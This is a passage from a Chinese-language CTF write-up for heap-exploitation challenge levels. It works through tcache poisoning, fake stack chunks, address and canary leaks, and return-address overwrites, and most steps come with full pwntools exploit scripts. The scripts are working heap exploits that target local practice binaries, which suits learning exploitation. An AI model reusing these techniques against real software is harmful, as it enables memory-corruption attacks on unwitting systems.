title="level8.0"></a>level8.0</h4><p>如果你想要poison的最低字节地址中，有换行符、水平制表符等会隔绝scanf读入的值的话，可以考虑申请与你想申请的地址相近的其他地址绕过。</p><p>这里无非就是从更低的地址写入更多的数据覆盖。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level8.0&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br><br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br><span class="hljs-comment"># 因为0a,09都会截断输入，所以用08。那么相应的后面输入多覆盖两个字节。</span><br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p64(<span class="hljs-number">0x426608</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">18</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level8-1-2"><a href="#level8-1-2" class="headerlink" title="level8.1"></a>level8.1</h4><p>exp一致，改改address就行。</p><h4 id="level9-0-3"><a href="#level9-0-3" class="headerlink" title="level9.0"></a>level9.0</h4><p>这一题不让我们把secret地址malloc出来，也就不能scanf往里写了。但是其实之前我们发现每次malloc会把key清0，之前尝试leak的时候就出现这个问题，所以才有思路scanf往里直接写。那么我们直接malloc两次就行了。第一次在secret地址，第二次在secret - 8的地址，这样就能把secret清空了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level9.0&quot;</span>)<br><span class="hljs-comment"># 清空secret+8 ~ secret+15 </span><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p64(<span class="hljs-number">0x426553</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br><span class="hljs-comment"># 清空secret ~ secret+7</span><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>,p64(<span class="hljs-number">0x42654b</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>,<span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>,<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">16</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level9-1-3"><a href="#level9-1-3" class="headerlink" title="level9.1"></a>level9.1</h4><p>exp一致，改改地址就行。</p><h4 id="level10-0-3"><a href="#level10-0-3" class="headerlink" title="level10.0"></a>level10.0</h4><p>它有两个leak，一个是main的入口地址，一个是我们malloc时保存堆地址的指针数组地址。</p><p>根据ida可以通过指针数组地址算出rbp的地址，相对应的也就控制了返回地址。那么我们通过malloc存储main返回地址的栈地址，然后将写入win函数的地址。最后再quit即可。win函数的入口地址可以通过main函数的地址算出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level10.0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The local stack address of your allocations is at: &quot;</span>)<br>alloc_stack = p.recv(<span class="hljs-number">14</span>)<br>alloc_stack = <span class="hljs-built_in">int</span>(alloc_stack, <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The address of main is at: &quot;</span>)<br>main_addr = p.recv(<span class="hljs-number">14</span>)<br>main_addr = <span class="hljs-built_in">int</span>(main_addr, <span class="hljs-number">16</span>)<br>ret_addr = alloc_stack + <span class="hljs-number">0x118</span><br>win_addr = main_addr - <span class="hljs-number">0x1afd</span> + <span class="hljs-number">0x1a00</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ret_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(win_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, p64(ret_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, p64(win_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;quit&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level10-1-3"><a href="#level10-1-3" class="headerlink" title="level10.1"></a>level10.1</h4><p>有些奇怪的IO问题，跑exp偶尔会出错。我写的exp确实挺烂的，啊哈哈。</p><h4 id="level11-0-3"><a href="#level11-0-3" class="headerlink" title="level11.0"></a>level11.0</h4><p>这题会有fork然后执行echo。然后菜单多了个echo的选项，看一下这个echo函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">echo</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> **argv; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  _WORD v4[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+22h] [rbp-Eh] BYREF</span><br><br>  *(_QWORD *)&amp;v4[<span class="hljs-number">3</span>] = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)v4, <span class="hljs-string">&quot;Data:&quot;</span>);<br>  argv = (<span class="hljs-type">char</span> **)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20u</span>LL);<br>  *argv = <span class="hljs-string">&quot;/bin/echo&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = (<span class="hljs-type">char</span> *)v4;<br>  argv[<span class="hljs-number">2</span>] = (<span class="hljs-type">char</span> *)(a1 + a2);<br>  argv[<span class="hljs-number">3</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( !fork() )<br>  &#123;<br>    execve(*argv, argv, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  wait(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ *(_QWORD *)&amp;v4[<span class="hljs-number">3</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>调试一下不难发现<code>/bin/echo</code>这个字符串在<code>base_adr + 0x33f8</code>处。那么可以通过<code>echo 0 0</code>拿到<code>base_adr + 0x33f8</code>从而算出<code>base_addr</code></p><p>同理，根据<code>rbp</code>所存的为上一个函数的栈地址，也就是main函数的栈帧rbp。那么通过<code>echo 0 8</code>拿到<code>v4</code>的地址，那么对应的也就拿到了</p><p><code>echo</code>函数的<code>rbp</code>栈地址。最后根据<code>echo</code>函数的栈的地址，能够根据偏移算出<code>main</code>函数的<code>rbp</code>地址，相应的也就拿到了<code>main_ret</code>地址。最后的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level11.1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;echo 0 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>base_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x2110</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(base_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;echo 0 8&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>main_ret_adr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) + <span class="hljs-number">0xe</span> + <span class="hljs-number">0x160</span> + <span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_ret_adr:&quot;</span>, <span class="hljs-built_in">hex</span>(main_ret_adr))<br>win_addr = base_addr + <span class="hljs-number">0x1500</span><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, p64(main_ret_adr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 1 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 100&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, p64(win_addr))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/quit): &quot;</span>, <span class="hljs-string">b&quot;quit&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level11-1-3"><a href="#level11-1-3" class="headerlink" title="level11.1"></a>level11.1</h4><p>改改偏移。</p><h4 id="level12-0-3"><a href="#level12-0-3" class="headerlink" title="level12.0"></a>level12.0</h4><p>通过<code>stack_scanf</code>能够在栈上创建一个<code>fake chunk</code>，这使得我们能够free。但是需要谨记在<code>bin</code>中，<code>chunk_size</code>字段的最低位要为1。exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level12.1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>pause()<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span> + p64(<span class="hljs-number">0x00</span>) + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0x00</span>) + p64(<span class="hljs-number">0x00</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_free&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/stack_malloc_win/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_malloc_win&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level12-1-3"><a href="#level12-1-3" class="headerlink" title="level12.1"></a>level12.1</h4><p>同理，只需要构造一个<code>fake chunk</code>，构造<code>fake chunk</code>其实只需要覆盖<code>size</code>字段。</p><h4 id="level13-0-3"><a href="#level13-0-3" class="headerlink" title="level13.0"></a>level13.0</h4><p>这题有点炸裂，我看ida反编译出来的<code>scanf</code>操作只能限制输入<code>127</code>个字节。结果实际上是和<code>chunk size</code>一致的，也就是说你的<code>chunk size</code>越大那么你的<code>scanf</code>就越大。<del>这是一个傻子在疯狂算偏移之后，发现无法覆盖secret然后绞尽脑汁发现没有办法后试了一下后醒悟的</del></p><p>那么这exp简直不要太好写，直接覆盖掉<code>secret</code>就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level13.0&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>pause()<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span>+ p64(<span class="hljs-number">0x101</span>) + p64(<span class="hljs-number">0x101</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_free&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 248&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">256</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Secret: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">16</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;quit&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level13-1-3"><a href="#level13-1-3" class="headerlink" title="level13.1"></a>level13.1</h4><p>同上，改两个<code>chunk_size</code>即可。</p><h4 id="level14-0-3"><a href="#level14-0-3" class="headerlink" title="level14.0"></a>level14.0</h4><p><code>echo</code>又回归了<code>Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit)</code></p><p>它依然会malloc<code>0x20</code>个字节，这题就需要泄露栈地址和基地址，然后计算出<code>main_ret_addr</code>和<code>win_addr</code></p><blockquote><p>之前一直没说，chunk的size字段和实际申请的size的关系：</p><p><code>malloc(24)</code>时，那么实际会分配32字节的数据，<code>24</code>字节的用户数据，<code>8</code>字节的头部。而<code>size</code>字段为：<code>0x21</code>，因为三个标志位分别为:<code>P=1</code>,<code>M=0</code>,<code>N=0</code>，最低位为P因此为<code>0x21</code></p></blockquote><p>思路就是首先通过<code>echo</code>拿到<code>/bin/sh</code>的地址，然后减去其偏移则得到程序基址。那么就得到了<code>win</code>函数的入口地址。</p><p>随后，通过<code>stack_scanf</code>和<code>stack_free</code>创建一个<code>fake chunk</code>，然后通过<code>malloc</code>这个chunk从而拿到栈上的地址，再通过<code>echo</code>将<code>canary</code>泄露出来。最后再通过<code>scanf</code>模拟栈溢出，然后覆盖返回地址为<code>win_addr</code>就行了。</p><p>当然，这里有两个问题：</p><ul><li><code>canary</code>有可能某个字节随机为制表符<code>0x09</code>和<code>0x0a</code>等，这种情况下使用<code>scanf(&quot;%s&quot;,v14)</code>时就会出现截断，导致后面的数据不会被接收，从而出错。</li><li>同理，这里的<code>win_addr</code>也有可能会出现这个问题。</li></ul><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level14.1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;echo 0 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>base_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x2110</span><br>win_addr = base_addr + <span class="hljs-number">0x141d</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/scanf/stack_free/stack_scanf/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span>+ p64(<span class="hljs-number">0x00</span>) + p64(<span class="hljs-number">0x21</span>))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function 